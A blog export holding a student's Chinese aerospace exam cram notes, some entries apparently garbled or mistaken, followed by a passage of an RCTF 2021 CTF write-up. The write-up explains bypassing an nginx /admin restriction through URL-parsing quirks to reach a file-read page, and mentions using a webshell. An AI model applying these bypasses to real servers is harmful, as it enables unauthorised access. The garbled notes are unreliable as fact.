    <content><![CDATA[<h2 id="航概期末绝杀"><a href="#航概期末绝杀" class="headerlink" title="航概期末绝杀"></a>航概期末绝杀</h2><p>航概期末绝杀的，前两天刷的第一遍题库毛也没记住，考前13个小时开始重新二刷，连刷带整理，连续肝了12个小时，刷了两千道题。</p>
<p>这是顺手整理的阴间资料，总算是把考试挺过去了。</p>
<span id="more"></span>
<h3 id="直升机"><a href="#直升机" class="headerlink" title="直升机"></a>直升机</h3><p>直9 阿帕奇</p>
<h3 id="一代超声速"><a href="#一代超声速" class="headerlink" title="一代超声速"></a>一代超声速</h3><p>F100，米格19</p>
<h3 id="二代超声速"><a href="#二代超声速" class="headerlink" title="二代超声速"></a>二代超声速</h3><p>米格21，F104</p>
<h3 id="超三倍声速"><a href="#超三倍声速" class="headerlink" title="超三倍声速"></a>超三倍声速</h3><p>米格25，SR71，XB37</p>
<h3 id="三代战斗机"><a href="#三代战斗机" class="headerlink" title="三代战斗机"></a>三代战斗机</h3><p>F15，Su27，米格29</p>
<h3 id="四代战斗机"><a href="#四代战斗机" class="headerlink" title="四代战斗机"></a>四代战斗机</h3><p>F35，歼31，歼20，F22</p>
<h3 id="我国的三代战斗机"><a href="#我国的三代战斗机" class="headerlink" title="我国的三代战斗机"></a>我国的三代战斗机</h3><p>歼10，11，16</p>
<h3 id="隐形机"><a href="#隐形机" class="headerlink" title="隐形机"></a>隐形机</h3><p>F117，F22，b2</p>
<h3 id="二三代隐形机"><a href="#二三代隐形机" class="headerlink" title="二三代隐形机"></a>二三代隐形机</h3><p>没有F117</p>
<h3 id="隐形直升机"><a href="#隐形直升机" class="headerlink" title="隐形直升机"></a>隐形直升机</h3><p>科曼奇</p>
<p>F80 喷气机</p>
<h3 id="二战飞机"><a href="#二战飞机" class="headerlink" title="二战飞机"></a>二战飞机</h3><p>没有米格9</p>
<h3 id="直升机-1"><a href="#直升机-1" class="headerlink" title="直升机"></a>直升机</h3><ul>
<li>升力周期改变：变距</li>
<li>总距：安装角增大增小</li>
<li><p>尾桨的推力：脚</p>
</li>
<li><p>拉力靠桨距</p>
</li>
<li>自动倾斜器带角度：不能同时增大桨距</li>
<li>自动倾斜器上下： 上下+同时</li>
</ul>
<p>第一架航天飞机：哥伦比亚</p>
<h3 id="导弹"><a href="#导弹" class="headerlink" title="导弹"></a>导弹</h3><p>有翼导弹：高机动，巡航</p>
<p>战术弹道：1000km</p>
<p>弹道导弹控制方式：没有翼面</p>
<p>现代巡航导弹：起飞质量小，不同的目标</p>
<h2 id="飞行原理"><a href="#飞行原理" class="headerlink" title="飞行原理"></a>飞行原理</h2><p>无人机</p>
<p>2加速，2减速 偏航</p>
<h3 id="声爆：无推力"><a href="#声爆：无推力" class="headerlink" title="声爆：无推力"></a>声爆：无推力</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210625232951217.png" alt="image-20210625232951217"></p>
<h3 id="减小波阻"><a href="#减小波阻" class="headerlink" title="减小波阻"></a>减小波阻</h3><p>三角机翼</p>
<h3 id="大气层"><a href="#大气层" class="headerlink" title="大气层"></a>大气层</h3><p>对流层：下降，水平流动</p>
<p>平流层：先不变再升高</p>
<p>中间层：下降</p>
<p>热层：温度升高</p>
<h3 id="阻力"><a href="#阻力" class="headerlink" title="阻力"></a>阻力</h3><ul>
<li>干扰阻力:整流片</li>
<li>粘性摩擦阻力：无飞行形状</li>
<li>粘性压差阻力：流线型  ，飞行器形状，最大迎风面积</li>
<li>诱导阻力：升力产生的，和相对位置无关：  减少方式：翼梢小翼和大展弦比</li>
<li>激波阻力：高速才有，机翼尖锐</li>
</ul>
<p>激波：波面后气流密度变大，速度降低，压强变大，跟温度没关系</p>
<p>民用飞机：后掠机翼 延缓激波</p>
<p>气流的速度减小</p>
<p>翼尖时速：加装翼刀、锯齿缺口。</p>
<h2 id="外形"><a href="#外形" class="headerlink" title="外形"></a>外形</h2><h3 id="鸭子："><a href="#鸭子：" class="headerlink" title="鸭子："></a>鸭子：</h3><p>不稳</p>
<h3 id="自旋稳定："><a href="#自旋稳定：" class="headerlink" title="自旋稳定："></a>自旋稳定：</h3><h3 id="前掠翼"><a href="#前掠翼" class="headerlink" title="前掠翼"></a>前掠翼</h3><p>X29 C37</p>
<p>失速机动性能好</p>
<p>起飞着陆性能好</p>
<h3 id="变后掠翼"><a href="#变后掠翼" class="headerlink" title="变后掠翼"></a>变后掠翼</h3><p>米格23，狂风，F14,B1，全选</p>
<p>阻力小</p>
<p>目的：</p>
<ul>
<li>改善低速和告诉性能</li>
<li>提高临街马赫数</li>
</ul>
<h3 id="三角翼"><a href="#三角翼" class="headerlink" title="三角翼"></a>三角翼</h3><p>没有升力大</p>
<h3 id="小展弦比飞机"><a href="#小展弦比飞机" class="headerlink" title="小展弦比飞机"></a>小展弦比飞机</h3><p>优点：激波阻力小，机动性能好</p>
<h3 id="超临界翼型"><a href="#超临界翼型" class="headerlink" title="超临界翼型"></a>超临界翼型</h3><p>圆的</p>
<h4 id="歼20"><a href="#歼20" class="headerlink" title="歼20"></a>歼20</h4><p>鸭翼布局，双发</p>
<h3 id="歼31"><a href="#歼31" class="headerlink" title="歼31"></a>歼31</h3><p>单座，双发</p>
<h3 id="大部分直升机"><a href="#大部分直升机" class="headerlink" title="大部分直升机"></a>大部分直升机</h3><p>轮式起落架</p>
<h3 id="轻型直升机"><a href="#轻型直升机" class="headerlink" title="轻型直升机"></a>轻型直升机</h3><p>滑橇式起落架</p>
<p>推力矢量 和超声速无关，没有摆动发动机</p>
<h3 id="飞艇"><a href="#飞艇" class="headerlink" title="飞艇"></a>飞艇</h3><p>靠发动力提供动力</p>
<p>静升力60 70，提供：升力面 充入氦气的气囊</p>
<p>速度 30 - 40</p>
<p>升降：加热程度</p>
<p>升降舵：操纵灵魂，多用于小型飞艇</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626041806765.png" alt="image-20210626041806765"></p>
<p>副气囊：有操纵选操纵，可以调节副气囊大小</p>
<p>和气球的区别：吊舱和气囊的链接不同，方向控制不同</p>
<h3 id="气球"><a href="#气球" class="headerlink" title="气球"></a>气球</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626041748215.png" alt="image-20210626041748215"></p>
<p>氢气球：   抛物放气  升降，不能进行方向控制</p>
<p>热气球：  加热 放气  升降</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626043743316.png" alt="image-20210626043743316"></p>
<h2 id="发动机"><a href="#发动机" class="headerlink" title="发动机"></a>发动机</h2><p>空气喷气发动机和火箭发动机 喷气发动机</p>
<h3 id="傻逼形态"><a href="#傻逼形态" class="headerlink" title="傻逼形态"></a>傻逼形态</h3><p>轴流式 压气机转子叶片 扩散形，改变气流方向</p>
<p>亚声速飞行 尾喷管 收缩性</p>
<p>亚声速飞行 进气管 扩散性</p>
<p>涡轮喷气发动机 导向器叶片 收缩性</p>
<p>火箭发动机的喷管 收缩-扩散</p>
<p>拉瓦尔喷管尾喷管</p>
<h3 id="傻逼状态"><a href="#傻逼状态" class="headerlink" title="傻逼状态"></a>傻逼状态</h3><p>起飞状态：涡轮喷气发动机 推力最大</p>
<p>涡轮喷气发动机：起飞状态和慢车状态</p>
<p>慢车状态是起飞状态的4%</p>
<p>巡航状态是起飞推力的 65-75</p>
<p>巡航最省油</p>
<h3 id="燃烧室"><a href="#燃烧室" class="headerlink" title="燃烧室"></a>燃烧室</h3><p>分成两股：冷却火焰筒</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626013933994.png" alt="image-20210626013933994"></p>
<h3 id="涡轮螺桨发动机"><a href="#涡轮螺桨发动机" class="headerlink" title="涡轮螺桨发动机"></a>涡轮螺桨发动机</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626010248379.png" alt="image-20210626010248379"></p>
<p>噪声太大，不太适合在客机</p>
<h3 id="涡轮喷气"><a href="#涡轮喷气" class="headerlink" title="涡轮喷气"></a>涡轮喷气</h3><p><strong>对空气增压：</strong> 进气管，压气机</p>
<p>耗油率搞，推力大，</p>
<p>噪音大</p>
<p>航空煤油</p>
<p>声障</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626005747087.png" alt="image-20210626005747087"></p>
<h3 id="固体火箭发动机"><a href="#固体火箭发动机" class="headerlink" title="固体火箭发动机"></a>固体火箭发动机</h3><p>排出燃气，反向喷气</p>
<p>用于导弹，填空火箭，助推器</p>
<p>比液体燃烧室温度低</p>
<p>比冲比液体菜</p>
<p>没有控制活门</p>
<p>药柱包覆层：<strong>阻止燃烧</strong>，控制推力大小</p>
<h3 id="涡轮轴发动机"><a href="#涡轮轴发动机" class="headerlink" title="涡轮轴发动机"></a>涡轮轴发动机</h3><p>直升机</p>
<h3 id="涡轮风扇发动机"><a href="#涡轮风扇发动机" class="headerlink" title="涡轮风扇发动机"></a>涡轮风扇发动机</h3><p>风扇由低压涡轮带动</p>
<p>排气速度不大</p>
<h3 id="涡轮江山发动机"><a href="#涡轮江山发动机" class="headerlink" title="涡轮江山发动机"></a>涡轮江山发动机</h3><p>静子叶片，对气流不增速</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626004821037.png" alt="image-20210626004821037"></p>
<h3 id="离心式压气机"><a href="#离心式压气机" class="headerlink" title="离心式压气机"></a>离心式压气机</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626010445547.png" alt="image-20210626010445547"></p>
<h3 id="串联火箭"><a href="#串联火箭" class="headerlink" title="串联火箭"></a>串联火箭</h3><h3 id="并联火箭"><a href="#并联火箭" class="headerlink" title="并联火箭"></a>并联火箭</h3><p>飞行阻力大，干扰大，链接复杂</p>
<h3 id="固液混合发动机"><a href="#固液混合发动机" class="headerlink" title="固液混合发动机"></a>固液混合发动机</h3><p>还得燃料传输系统</p>
<h3 id="离心式压气机-1"><a href="#离心式压气机-1" class="headerlink" title="离心式压气机"></a>离心式压气机</h3><p>小于10</p>
<h3 id="涡轮燃气发动机"><a href="#涡轮燃气发动机" class="headerlink" title="涡轮燃气发动机"></a>涡轮燃气发动机</h3><p>最广泛的航空</p>
<h3 id="液氢"><a href="#液氢" class="headerlink" title="液氢"></a>液氢</h3><p>沸点低，易燃易爆，不易储存</p>
<h3 id="常用发动机"><a href="#常用发动机" class="headerlink" title="常用发动机"></a>常用发动机</h3><p>战术导弹 固体火箭</p>
<p>高超声速 火箭发动机 冲压发动机</p>
<p>巡航导弹 空气喷气</p>
<h2 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h2><h3 id="高度"><a href="#高度" class="headerlink" title="高度"></a>高度</h3><p>相对高度：机场</p>
<p>绝对高度：海平面</p>
<p>真实高度：地面，无线电</p>
<h3 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h3><p>地形匹配导航 地形高度轮廓 丘陵 一维匹配导航</p>
<p>景象匹配 地表特征</p>
<p>全面信标系统VOR 侧向无线电导航</p>
<h3 id="惯性导航-陀螺"><a href="#惯性导航-陀螺" class="headerlink" title="惯性导航 陀螺"></a>惯性导航 陀螺</h3><p>陀螺地平仪 没有磁罗盘</p>
<p>平台式惯导：机电陀螺平台</p>
<p>捷联式惯导：数字平台</p>
<p>俯仰</p>
<h3 id="自动控制"><a href="#自动控制" class="headerlink" title="自动控制"></a>自动控制</h3><p>气动舵面 油门杆</p>
<p>综合放大装置 大脑</p>
<p>敏感元件 眼睛</p>
<p>发动机 心脏</p>
<p>仪表着陆 微博着陆</p>
<h3 id="导航-1"><a href="#导航-1" class="headerlink" title="导航"></a>导航</h3><p>机场 位置 高度</p>
<p>侧向无线电导航 测距无线电导航 测距差无线电导航</p>
<h3 id="温度控制系统"><a href="#温度控制系统" class="headerlink" title="温度控制系统"></a>温度控制系统</h3><p>航天器在太空中，无对流</p>
<h3 id="主飞行显示器"><a href="#主飞行显示器" class="headerlink" title="主飞行显示器"></a>主飞行显示器</h3><p>航向角 俯仰角</p>
<p>无人机数据链路 视频接收器 终端处理器</p>
<p>GPS  先监控站  运算处理：主控站</p>
<p>1234 总(大静)仪开</p>
<h2 id="飞机结构"><a href="#飞机结构" class="headerlink" title="飞机结构"></a>飞机结构</h2><p>飞行器结构：受力部件，支撑构件</p>
<p>机身和机翼都不选复合</p>
<h3 id="机身"><a href="#机身" class="headerlink" title="机身"></a>机身</h3><h3 id="机翼"><a href="#机翼" class="headerlink" title="机翼"></a>机翼</h3><p>夹层壁板内部：（要轻），蜂窝夹层，泡沫塑料</p>
<p>薄壁构造机翼  蒙皮骨架式</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626040917542.png" alt="image-20210626040917542"></p>
<h3 id="前三点"><a href="#前三点" class="headerlink" title="前三点"></a>前三点</h3><p>优点不选前轮</p>
<p>缺点选前轮</p>
<p>后期</p>
<h3 id="后三点"><a href="#后三点" class="headerlink" title="后三点"></a>后三点</h3><p>缺点不选尾轮 早起</p>
<p>优点：迎角打，安装尾轮</p>
<h3 id="自行车"><a href="#自行车" class="headerlink" title="自行车"></a>自行车</h3><p>全是前轮</p>
<h3 id="车轮"><a href="#车轮" class="headerlink" title="车轮"></a>车轮</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626041001003.png" alt="image-20210626041001003"></p>
<h3 id="卫星"><a href="#卫星" class="headerlink" title="卫星"></a>卫星</h3><p>壳体不用合金钢</p>
<p>天线：全有</p>
<p>太阳能：可以可以，结构不必</p>
<h3 id="导弹-1"><a href="#导弹-1" class="headerlink" title="导弹"></a>导弹</h3><p>平面 巡航</p>
<p>10和X： 高机动</p>
<h3 id="材料"><a href="#材料" class="headerlink" title="材料"></a>材料</h3><p>航空航天领域的材料：没有黑色金属</p>
<p>机翼的整体翼梁  Al合金 合金钢</p>
<p>Mg最轻，密度小，比强度和比刚度高，机械加工性能优良</p>
<p>Al合金 比强度比刚度好，价格低廉</p>
<p>钛合金：比强度搞，耐热性好</p>
<h3 id="着陆"><a href="#着陆" class="headerlink" title="着陆"></a>着陆</h3><h4 id="软着陆"><a href="#软着陆" class="headerlink" title="软着陆"></a>软着陆</h4><p>空间探测器： 没有阻力伞 （真空）</p>
<h3 id="航天飞机"><a href="#航天飞机" class="headerlink" title="航天飞机"></a>航天飞机</h3><p>可重复利用：助推火箭 轨道器</p>
<p>飞机的助推火箭不能回收利用</p>
<p>载人飞船的控制中心：成员返回舱</p>
<h2 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h2><p>现代飞机：kelly</p>
<p>2009年预警机 KJ2000</p>
<h2 id="年份"><a href="#年份" class="headerlink" title="年份"></a>年份</h2><p>1883 活塞式</p>
<p>1903 莱特兄弟 用于航空的活塞</p>
<p>1937 涡轮喷气</p>
<p>1947 X1 美国 声障</p>
<p>1957 苏联卫星</p>
<p>1968 前苏联 超声速</p>
<p>1969 和谐号 超声速</p>
<p>1981 美国航天飞机试飞</p>
<p>1986 挑战者</p>
<p>1994 GPS建设完成</p>
<p>1998 国际空间站</p>
<p>1999 神舟一号</p>
<p>2003 哥伦比亚，神舟五号</p>
<p>2007 嫦娥1号</p>
<p>2007.2 大飞机</p>
<p>2008 天链 8个 36000km</p>
<p>2008 神舟七号</p>
<p>2010 T-50</p>
<p>2011 天宫一号和神舟八号对接</p>
<p>2017 C919</p>
<p>2017天舟一号 太空加油</p>
<h3 id="长征系列"><a href="#长征系列" class="headerlink" title="长征系列"></a>长征系列</h3><p>长征一号：近地轨道小型</p>
<p>长征2号  500Km  F载人</p>
<p>三号：高轨道，3甲 嫦娥</p>
<p>四号：太阳同步轨道</p>
<h3 id="我国："><a href="#我国：" class="headerlink" title="我国："></a>我国：</h3><p>费俊龙和聂海胜一组</p>
<p>翟志刚 太空行走第一人</p>
<p>天宫2号： 太空实验室</p>
<p>气象卫星：风云</p>
<h3 id="神州"><a href="#神州" class="headerlink" title="神州"></a>神州</h3><p>半弹道</p>
<p>神舟三号：假人</p>
<p>神舟四号：有害气体</p>
<p>嫦娥三号：星标软着陆</p>
<p>通信卫星：东方红</p>
<p>北京2号 火箭</p>
<h2 id="恶心的数字"><a href="#恶心的数字" class="headerlink" title="恶心的数字"></a>恶心的数字</h2><p>16个国家空间站</p>
<p>航天器回收的再入段： 80~100</p>
<p>活塞速度816</p>
<p>涡轮罗江发动机 500 700</p>
<p>比冲 5000</p>
<p>推重比 10</p>
<p>远望 7艘</p>
<p>俄罗斯卫星：3个平面</p>
<p>GPS：24个卫星 6个平面，4颗确定一个飞行器，周期12个小时，轨道高度20000km</p>
<p>战斗机 正过载 8~9</p>
<p>北斗 20多颗</p>
<p>地基系统 覆盖率 2~3</p>
<p>20世纪70年代，出现电子屏</p>
<p>气象 三类</p>
<p>空中和海中的121.500HZ</p>
<p>卫星测控系统的测控作用距离为100000km以下</p>
<p>中继卫星对中低轨道 40~50%</p>
<p>美国航天飞机 10人</p>
<p>和平号 5个舱室</p>
<p>美国轨道器飞行 30天</p>
<p>波音737 2台发动机</p>
<p>安225 32个轮胎</p>
<p>鹞式战斗机 6个喷口</p>
]]></content>
  </entry>
  <entry>
    <title>rctf2021.md</title>
    <url>/2021/09/13/rctf2021/</url>
    <content><![CDATA[<h1 id="rctf2021"><a href="#rctf2021" class="headerlink" title="rctf2021"></a>rctf2021</h1><h2 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h2><p>基本是躺的比赛，白天对着php源码看了半天也没看出来漏洞，然后去看密码，只要能分解出一个512bit的数就能出了，可惜分不得。再看去misc，图片那个题误以为p,q,m很大，考虑一堆不同的像素点列几万个方程z3去解，上传上去wget下来发现图片有压缩觉得不可做于是立刻放弃。ezshell那个网上抄了个冰蝎马的代码，编译出.class丢给队友，服务器直接500了，后来发现是jdk版本太高，就交给队友去下载新版本了。回了趟宿舍睡了个觉，早上一醒发现队友们已经把miscAK了，同时又把一个web一个pwn干出来了，最后排名是21，虽然是20名交writeup，但也真的太牛了。。很难过的反思自己为什么这么废物了一上午后决定好好去复盘一下这场比赛。</p>
<span id="more"></span>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>拿到源码先审，很显然是要admin登进去，用户名是admin，但是密码我们无法获取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$request</span>-&gt;data-&gt;username === <span class="variable">$username</span> &amp;&amp; <span class="variable">$request</span>-&gt;data-&gt;password === <span class="variable">$password</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$app</span>-&gt;redirect(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此处表明我们需要有user的session才能去登入admin，另外在此处也发现了一点东西：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$app</span>-&gt;route(<span class="string">&#x27;/*&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$app</span>;</span><br><span class="line">    <span class="variable">$request</span> = <span class="variable">$app</span>-&gt;request();</span><br><span class="line">    <span class="variable">$app</span>-&gt;render(<span class="string">&quot;head&quot;</span>,[],<span class="string">&quot;head_content&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$request</span>-&gt;url,<span class="string">&quot;login&quot;</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$app</span>-&gt;redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这个<code>return true</code>表示的意思就是可以继续这个路由的访问，可以看到，要么有<code>_session[user]</code>,要么url里包含<code>login</code>，就可以直接进到我们想去的路由中。</p>
<p>在web层面我们直接尝试访问<code>/admin</code>，却发现在服务器层被nginx403弹回来了，回去看<code>nginx.conf</code>，里面有很奇怪的点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root   /var/www/html;</span><br><span class="line">location /admin &#123;</span><br><span class="line">    allow 127.0.0.1;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br><span class="line">location / &#123;</span><br><span class="line">    index  index.php;</span><br><span class="line">    try_files $uri @phpfpm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只有本地才能访问/admin???那框架上在写什么东西？？</p>
<p>第一步很明确，我们要绕过nginx对<code>/admin</code>这个路由的解析，这个绕法我在当时无聊的时候发现的一个特性，就是在之前无论输入什么，比如<code>/views/index.php</code>,<code>/views/template.php</code>，结果浏览器跳转的居然是<code>/views/login</code>,这就十分灵性，理论上应该跳回<code>/login</code>的，为了解决这个问题，我们去审这个Flight框架的路由。</p>
<p>重点看<code>/flight/net</code>部分的几个php文件，分别是解析request包，response包和route的，很灵性的就是我们之前在<code>index.php</code>看到的<code>$request-&gt;url</code>。这个<code>url</code>是怎么得到的？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;url&#x27;</span> =&gt; str_replace(<span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;%40&#x27;</span>, <span class="built_in">self</span>::getVar(<span class="string">&#x27;REQUEST_URI&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)),</span><br><span class="line">                <span class="string">&#x27;base&#x27;</span> =&gt; str_replace(<span class="keyword">array</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27; &#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%20&#x27;</span>), dirname(<span class="built_in">self</span>::getVar(<span class="string">&#x27;SCRIPT_NAME&#x27;</span>))),</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;base != <span class="string">&#x27;/&#x27;</span> &amp;&amp; strlen(<span class="keyword">$this</span>-&gt;base) &gt; <span class="number">0</span> &amp;&amp; strpos(<span class="keyword">$this</span>-&gt;url, <span class="keyword">$this</span>-&gt;base) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;url = substr(<span class="keyword">$this</span>-&gt;url, strlen(<span class="keyword">$this</span>-&gt;base));</span><br><span class="line">        &#125;    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>REQUEST_URI</code>是从nginx转发过来的,是原生请求URI</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location @phpfpm &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">    fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">    fastcgi_pass   php:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root/index.php;</span><br><span class="line">    fastcgi_param  REQUEST_URI  $uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以测试一下REQUEST_URI和SCRIPT_NAME都是什麽。</p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914001902249.png" alt="image-20210914001902249"></p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914001923674.png" alt="image-20210914001923674"></p>
<p>结合上述代码我们就知道了，<code>$this-&gt;url</code>会拿到之前的<code>base</code>,把<code>/</code>全部拿掉，只剩下最后一部分，才是真正的<code>request-&gt;url</code>，在<code>index.php</code>匹配里全都是这个部分，这就能解决之前说的为什么<code>views/index.php</code>会跳回<code>views/login</code>的问题。</p>
<p>所以要想绕过nginx层仅有本地访问的限制，我们只需要修改为<code>/1/admin</code>，就能绕过nginx，而框架会把我们的url解析成<code>/admin</code>，算是绕过了第一部分。</p>
<p>第二部分是这段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$request</span>-&gt;url,<span class="string">&quot;login&quot;</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要在url里有login就能成功进入/admin了,放在哪里合适呢？思来想去只有放在?充当一个变量才合适。</p>
<p>在这里我们引入nginx里对$uri的理解：<a href="https://www.jianshu.com/p/b9705efc2792">https://www.jianshu.com/p/b9705efc2792</a></p>
<ul>
<li>进行一次url解码</li>
<li><p>去除所有查询字符串，即?及其后面的部分</p>
</li>
<li><p>将连续重复的/替换为单个/</p>
</li>
</ul>
<p>可以测试一下：</p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914004841582.png" alt="image-20210914004841582"></p>
<p>nginx直接把?后面的东西给抹除了。</p>
<p>但是如果我们把<code>？</code>url编码一下，再放上去，nginx解码之后不会理解<code>?</code>是一个标识符，而是把他理解为一个普通的路由，至此，我们传给php-fpm的url就已经是<code>admin?login</code>,这个就是<code>request-&gt;url</code>，的确包含了<code>login</code>,所以理所应当的我们进入了admin这个身份，并且能看文件了！</p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914005001611.png" alt="image-20210914005001611"><br>快速过一遍/admin的代码，发现是读当前目录下的文件，通过scandir实现的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;h3&gt;File <span class="keyword">List</span>:&lt;/h3&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">light</span> <span class="title">border</span> <span class="title">rounded</span>-3&quot; <span class="title">style</span>=&quot;<span class="title">white</span>-<span class="title">space</span>: <span class="title">pre</span>-<span class="title">line</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        $<span class="title">dir</span> = <span class="title">pathinfo</span>($<span class="title">data</span>?$<span class="title">data</span>:&quot;.&quot;,<span class="title">PATHINFO_DIRNAME</span>);</span></span><br><span class="line"><span class="class">        <span class="title">foreach</span>(<span class="title">scandir</span>($<span class="title">dir</span>) <span class="title">as</span> $<span class="title">v</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=\&quot;/admin?data=<span class="subst">$dir</span>/<span class="subst">$v</span>\&quot;&gt;<span class="subst">$v</span>&lt;/a&gt;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$data</span>) &#123; <span class="meta">?&gt;</span>&lt;h3&gt;<span class="meta">&lt;?=</span> <span class="variable">$data</span> . <span class="string">&quot;:&quot;</span> <span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">light</span> <span class="title">border</span> <span class="title">rounded</span>-3&quot;&gt;&lt;<span class="title">code</span> <span class="title">style</span>=&quot;<span class="title">white</span>-<span class="title">space</span>: <span class="title">pre</span>-<span class="title">line</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">file_get_contents</span>($<span class="title">data</span>); ?&gt;&lt;/<span class="title">code</span>&gt;&lt;/<span class="title">div</span>&gt;&lt;?<span class="title">php</span> &#125; ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们读flag肯定要路径穿越回去，十分不幸的是，在<code>index.php</code>中，把路径穿越符全部禁掉了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isdanger</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$v</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isdanger(<span class="variable">$k</span>)||isdanger(<span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$v</span>,<span class="string">&quot;../&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
